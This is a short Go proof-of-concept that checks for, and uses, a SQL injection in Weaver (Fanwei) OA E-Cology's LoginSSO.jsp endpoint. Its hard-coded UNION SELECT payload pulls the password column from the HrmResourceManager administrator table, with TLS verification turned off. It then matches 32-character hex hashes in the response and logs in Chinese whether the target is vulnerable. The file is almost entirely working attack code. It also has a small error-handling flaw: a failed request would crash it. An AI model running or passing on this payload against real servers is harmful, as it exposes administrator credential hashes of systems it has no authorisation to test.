package poc

import (
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"
)

func LoginSSO(target string) {
	url := strings.TrimRight(target, "/")
	req, err := http.NewRequest("GET", url+"/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager", nil)
	if err != nil {
		return
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	defer resp.Body.Close()
	respbody, _ := io.ReadAll(resp.Body)
	tag := regexp.MustCompile(`\b[a-fA-F0-9]{32}\b`).MatchString(string(respbody))
	if resp.StatusCode == http.StatusOK && tag {
		log.Println("[+] 存在泛微OA E-Cology LoginSSO.jsp SQL注入漏洞")
		log.Println("[+] 漏洞url: ", url+"/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager")
	} else {
		log.Println("[-] 不存在泛微OA E-Cology LoginSSO.jsp SQL注入漏洞")
	}
}
